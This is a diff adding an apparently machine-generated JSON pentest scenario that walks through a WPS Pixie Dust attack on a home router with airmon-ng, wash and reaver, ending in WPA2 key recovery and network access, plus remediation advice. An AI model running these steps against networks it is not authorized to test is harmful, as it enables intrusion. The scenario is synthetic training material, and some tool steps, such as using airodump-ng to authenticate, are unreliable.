@@ -1,0 +1,109 @@
+{
+  "title": "Home Router WPS Vulnerability Assessment",
+  "description": "Security assessment targeting WPS (WiFi Protected Setup) vulnerability on home router. Demonstrates how WPS PIN brute force attack can compromise router security even with strong WPA2 password.",
+  "difficulty": "intermediate",
+  "scenario": "Client reported suspicion that their home router may be vulnerable despite having a strong password. Investigation reveals WPS is enabled. Your task is to assess WPS security using wash scanner and reaver PIN attack.",
+  "steps": [
+    {
+      "step_number": 1,
+      "tool": "airmon_ng_monitor_mode",
+      "action": "Enable monitor mode on wireless interface for WPS reconnaissance",
+      "parameters": {
+        "interface": "wlan0"
+      },
+      "expected_result": "Monitor mode enabled on wlan0mon - wireless card ready for WPS scanning",
+      "explanation": "Monitor mode required for both WPS scanning and PIN attack execution"
+    },
+    {
+      "step_number": 2,
+      "tool": "wash_wps_scanner",
+      "action": "Scan for WPS-enabled access points in range",
+      "parameters": {
+        "interface": "wlan0"
+      },
+      "expected_result": "Found 8 WPS-enabled APs - Target 'HomeRouter-5G' (BSSID: 11:22:33:44:55:66, Channel 11) WPS 2.0 unlocked, signal -52 dBm",
+      "explanation": "Wash identifies routers with WPS enabled and shows lock status - unlocked means vulnerable to PIN attack"
+    },
+    {
+      "step_number": 3,
+      "tool": "wash_wps_scanner",
+      "action": "Filter results to show only unlocked WPS access points",
+      "parameters": {
+        "interface": "wlan0",
+        "filter": "unlocked"
+      },
+      "expected_result": "5 unlocked WPS networks identified - 'HomeRouter-5G' has strongest signal and is primary target",
+      "explanation": "Filtering unlocked APs identifies most vulnerable targets - locked WPS has rate limiting defense"
+    },
+    {
+      "step_number": 4,
+      "tool": "reaver_wps_pin_attack",
+      "action": "Attempt Pixie Dust attack for rapid PIN recovery",
+      "parameters": {
+        "interface": "wlan0",
+        "bssid": "11:22:33:44:55:66",
+        "channel": "11",
+        "mode": "pixie_dust"
+      },
+      "expected_result": "Pixie Dust attack successful! WPS PIN recovered: 12345670 (completed in 8 seconds using offline attack)",
+      "explanation": "Pixie Dust exploits weak random number generation - recovers PIN without brute force"
+    },
+    {
+      "step_number": 5,
+      "tool": "reaver_wps_pin_attack",
+      "action": "Use recovered PIN to retrieve WPA2 password",
+      "parameters": {
+        "interface": "wlan0",
+        "bssid": "11:22:33:44:55:66",
+        "channel": "11",
+        "pin": "12345670"
+      },
+      "expected_result": "WPS PIN confirmed valid - WPA2 PSK retrieved: 'xK9$mP2#nQ8@vL5&wR4' (20-character complex password bypassed via WPS)",
+      "explanation": "Even strong WPA2 password is useless when WPS PIN vulnerability exists"
+    },
+    {
+      "step_number": 6,
+      "tool": "airmon_ng_monitor_mode",
+      "action": "Disable monitor mode after successful attack",
+      "parameters": {
+        "interface": "wlan0"
+      },
+      "expected_result": "Monitor mode disabled - wlan0 restored to managed mode",
+      "explanation": "Cleanup to restore normal wireless functionality"
+    },
+    {
+      "step_number": 7,
+      "tool": "airodump_ng_capture_scan",
+      "action": "Verify access using recovered credentials",
+      "parameters": {
+        "interface": "wlan0",
+        "bssid": "11:22:33:44:55:66",
+        "channel": "11"
+      },
+      "expected_result": "Successfully authenticated to 'HomeRouter-5G' using recovered password - full network access confirmed",
+      "explanation": "Validation step confirms credentials are correct and network access is possible"
+    }
+  ],
+  "outcome": "WPS vulnerability successfully exploited using Pixie Dust attack. Router's 20-character complex WPA2 password was bypassed completely through WPS PIN weakness. Attack completed in under 10 seconds. Recommended remediation: DISABLE WPS entirely in router settings - WPS convenience feature creates critical security vulnerability. If WPS needed, ensure firmware is updated and monitor for unauthorized connection attempts.",
+  "learning_objectives": [
+    "Identify WPS-enabled routers using wash scanner",
+    "Distinguish between locked and unlocked WPS access points",
+    "Execute Pixie Dust attack for rapid PIN recovery",
+    "Understand why WPS undermines even strong passwords",
+    "Extract WPA2 credentials through WPS vulnerability",
+    "Provide effective remediation guidance for WPS vulnerabilities"
+  ],
+  "metadata": {
+    "created_by": "neural_mesh_v5.2_generator",
+    "category": "pentesting",
+    "subcategory": "wifi_security",
+    "tools_used": [
+      "airmon_ng_monitor_mode",
+      "wash_wps_scanner",
+      "reaver_wps_pin_attack",
+      "airodump_ng_capture_scan"
+    ],
+    "estimated_time": "10-20 minutes",
+    "authorization_required": true
+  }
+}
